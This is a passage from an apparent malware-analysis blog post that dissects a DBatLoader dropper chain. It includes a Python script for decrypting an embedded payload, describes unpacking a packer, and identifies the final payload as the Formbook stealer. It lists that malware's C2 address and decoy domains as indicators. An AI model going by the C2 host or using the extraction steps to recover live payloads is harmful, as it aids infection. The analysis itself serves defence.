<li>the result is finally decrypted using function <code>0x416408</code>, the same algorithm that was used to perform the initial decryption of the YAK resource</li>
</ul>
<p>At this stage, I have a lot of questions to the programmer who wrote this. The main one is: <em>why oh god why?</em> Why adding so much complexity to the payload extraction process. The added measures don't help evading detection:</p>
<ul>
<li>manual reversers don't care about the extra layers. Most of them youl just use a debugger and go through the decryption process in one pass.</li>
<li>for reversers who likes to do everything statically (hi!), the added code is too simple to be considered as obfuscation.</li>
<li>antivirus programs don't care about the resource, they would just put a signature on the decryption code. Or even better, create an heuristic on the binary (which would be <em>very</em> easy considering Delphi program with dots as section names are <em>pretty</em> rare :)</li>
<li>"next-gen" machine-learning based antivirus also have a very easy time there</li>
<li>sandbox directly go through the decryption process and would grab the payload at injection time</li>
</ul>
<p>On the other hand, it makes the dropping code quite harder to maintain. I am a bit puzzled to be honest. Anyway, let us write the decryption algorithm in python. This python scripts must be run inside Malcat, with the third stage binary open:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span> <span class="nn">itertools</span>

<span class="k">def</span> <span class="nf">decrypt_yak</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
<span class="w">    </span><span class="sd">"""</span>
<span class="sd">    implements the first decryption layer of function 0x416408</span>
<span class="sd">    """</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="mh">0x21</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7e</span><span class="p">:</span>
            <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((((</span><span class="n">c</span> <span class="o">+</span> <span class="mh">0xe</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x5e</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x21</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>


<span class="k">def</span> <span class="nf">xor_payload</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
<span class="w">    </span><span class="sd">"""</span>
<span class="sd">    custom XOR, function 0x415c40</span>
<span class="sd">    """</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">data_byte</span><span class="p">,</span> <span class="n">key_byte</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">itertools</span><span class="o">.</span><span class="n">cycle</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">data_byte</span> <span class="o">^</span> <span class="n">key_byte</span> <span class="o">^</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">^</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span> <span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">add_payload</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
<span class="w">    </span><span class="sd">"""</span>
<span class="sd">    custom ADD, function 0x416368</span>
<span class="sd">    """</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="n">val</span> <span class="o">=</span> <span class="mi">335</span> <span class="o">%</span> <span class="n">key</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">+</span> <span class="n">val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="c1">#######################################</span>


<span class="n">yak_resource</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">struct</span><span class="p">[</span><span class="s2">"Resources.RCDATA.YAK.unk.Data"</span><span class="p">]</span>

<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_yak</span><span class="p">(</span><span class="n">yak_resource</span><span class="p">)</span>

<span class="c1"># split resource into fields</span>
<span class="n">delimiter</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[:</span><span class="mi">36</span><span class="p">]</span>
<span class="n">fields</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">delimiter</span><span class="p">):]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>

<span class="c1">#get important fields</span>
<span class="n">payload_data</span> <span class="o">=</span> <span class="n">fields</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">xor_key</span> <span class="o">=</span> <span class="n">fields</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">add_key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">fields</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Decrypting payload data (</span><span class="si">{}</span><span class="s2"> bytes) with XOR key '</span><span class="si">{}</span><span class="s2">' and ADD key </span><span class="si">{:d}</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
    <span class="nb">len</span><span class="p">(</span><span class="n">payload_data</span><span class="p">),</span> 
    <span class="n">xor_key</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"ascii"</span><span class="p">),</span> 
    <span class="n">add_key</span><span class="p">))</span>

<span class="n">step1</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload_data</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>

<span class="n">step2</span> <span class="o">=</span> <span class="n">step1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>     <span class="c1"># reverse</span>

<span class="n">step3</span> <span class="o">=</span> <span class="n">add_payload</span><span class="p">(</span><span class="n">step2</span><span class="p">,</span> <span class="n">add_key</span><span class="p">)</span>

<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_yak</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>

<span class="n">gui</span><span class="o">.</span><span class="n">open_after</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted</span><span class="p">),</span> <span class="s2">"yak_payload_plaintext"</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<p>Running this script, we obtain another PE file. Do you think it is the final malware? Do you? Of course not :) </p>
<h1 id="fourth-stage-stones-packer">Fourth stage: Stone's packer</h1>
<p>This time, believe it or not, we are not facing a Delphi program, but a packed 164KB binary featuring a weird <code>.Stone</code> section and a huge encrypted <code>.text</code> section. The sha256 of the binary is <code>b0b4a3897ef76dfebc9ccdc9b83b49cb6d23c08a5b010bf8960c0bb82d48c4bc</code>. How do we know it is packed you may ask? Well, it could be because the entropy is high, or <em>maybe</em> because it is written in the binary:</p>
<figure id="format14"><img alt="That is one hell of a stealth crypter" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stone.png"/> <figcaption>Figure 14: That is one hell of a stealth crypter</figcaption></figure>
<p>Yes, sometimes it is this easy :) Also the word <code>PowerLame</code> seems to imply we won't have a hard time cracking this one.</p>
<h2 id="unpacking-stones-packer">Unpacking Stone's packer</h2>
<p>Instead of diving into the code, let us have a quick sweep through the file. The <code>.text</code> section displays interesting properties, in particular the beginning of the section:</p>
<figure id="format15"><img alt="Start of encrypted .text section" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stone1.png"/> <figcaption>Figure 15: Start of encrypted .text section</figcaption></figure>
<p>The end of the first section is also interesting. Sections are usually padded with zeroes (or <code>PADDINGXXX</code> for the resource section), but here we got ones instead:</p>
<figure id="format16"><img alt="End of encrypted .text section" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stone2.png"/> <figcaption>Figure 16: End of encrypted .text section</figcaption></figure>
<p>Knowing that the most frequent x86 function prologue is <code>55 8B EC</code> (aka <code>push ebp; mov ebp, esp</code>), it looks like all bytes value are just one off. So let us try our hypothesis and just subtract 1 to the complete <code>.text</code> section. This can be done easily using Malcat's transforms, as we can see below: </p>
<figure id="format17"><img alt="Decrypting the .text section" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stone3.png"/> <figcaption>Figure 17: Decrypting the .text section</figcaption></figure>
<p>After reanalyzing the file, we can see that our hypothesis holds and the <code>.text</code> section has been successfully decrypted. Several functions are now visible, even if most of theme are obfuscated and part of the binary seem to remain encrypted. But anyway, we are now facing the last stage of the malware, and what we see should be enough to identify the malware.</p>
<h2 id="identifying-the-malware-family">Identifying the malware family</h2>
<p>Using the TLP:white Yara rule set from Malpedia, the decrypted binary is detected by <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.formbook">Malpedia's Formbook rule</a>:</p>
<figure id="format18"><img alt="Formbook detection" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/formbook.png"/> <figcaption>Figure 18: Formbook detection</figcaption></figure>
<p>Formbook is a well-known stealer-as-a-service used by a variety of threat actors for over five years. 
 It is designed to steal personal information and allow remote control via commands issued from a C2 server. It can steal passwords from locally installed software (browsers, chat clients, email clients and FTP clients), or directly from the user using keylogger and form-grabber components.
After submitting the sample toe <a href="https://www.joesandbox.com/analysis/526334/0/html">Joe sandbox</a>, we get access to the Formbook configuration data and the address of its C2 server:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">"C2 list"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="s2">"www.mgav26.xyz/n8rn/"</span>
<span class="w">  </span><span class="p">],</span>
<span class="w">  </span><span class="nt">"decoy"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="s2">"jlvip1066.com"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"gconsultingfirm.com"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"foundergomwef.xyz"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"bredaslo.com"</span><span class="p">,</span>
<span class="w">    </span><span class="c1">// ... (truncated)</span>
<span class="w">    </span><span class="s2">"counterpokemon.com"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"beyerenterprisestreeservice.com"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"phorganicfoods.com"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"hermespros.com"</span>
<span class="w">  </span><span class="p">]</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>And ... that's the end of the infection chain and the end of this article. </p>
<h1 id="conclusion">Conclusion</h1>
<p>While entry-level malware do not make headlines, it does not mean that they should be ignored altogether. Some of them are more than just mere droppers and feature multi-staged architectures. In this article, we have dissected a gran total of 4 intermediate malicious binaries that were used between the initial infection (an armed Excel spreadsheet) and the final malware (Formbook). </p>
<p>Each of them used different techniques, from exploits to cloud-based downloaders and event a bit of steganography. We developed python scripts to extract and decrypt the payload of each of them. These scripts can be applied to other instances of DBatLoader, like this other <a href="https://www.virustotal.com/gui/file/13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05">excel document</a>, which downloads another <a href="https://www.virustotal.com/gui/file/9e68a0780d3c86c44563ecb3ff063bd0daa87fa141de7e1022fa285f812dacae">DBatLoader first stage</a> using yet another picture for its steganography.</p>
</div>
</article>
</section>
<footer class="footer text-center py-4">
<small class="copyright">Copyright Â© <a href="https://malcat.fr" target="_blank">MALCAT</a></small><small class="copyright" style="margin-left:4em">View our <a href="https://malcat.fr/privacypolicy.html" target="_blank">privacy policy</a></small>
<div class="text-center w-100">
<ul class="social-list list-inline py-2 mx-auto">
<li class="list-inline-item"><a href="https://malcat.fr/rss.xml"><i class="fas fa-rss fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://twitter.com/malcat4ever"><i class="fab fa-twitter fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://discord.gg/Pf3s2ZKqtU"><i class="fab fa-discord fa-fw"></i></a></li>
<li class="list-inline-item"><a href="https://www.linkedin.com/company/malcat"><i class="fab fa-linkedin fa-fw"></i></a></li>
</ul><!--//social-list-->
</div><!--//dark-mode-toggle-->
</footer>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<script language="javascript">
tocbot.init({
  // Where to render the table of contents.
  tocSelector: '.js-toc',
  // Where to grab the headings to build the table of contents.
  contentSelector: '.js-toc-content',
  // Which headings to grab inside of the contentSelector element.
  headingSelector: 'h1, h2, h3',
  // For headings inside relative or absolute positioned containers within content.
  hasInnerContainers: true,
  collapseDepth: 4,
});
</script>
</body>
</html>
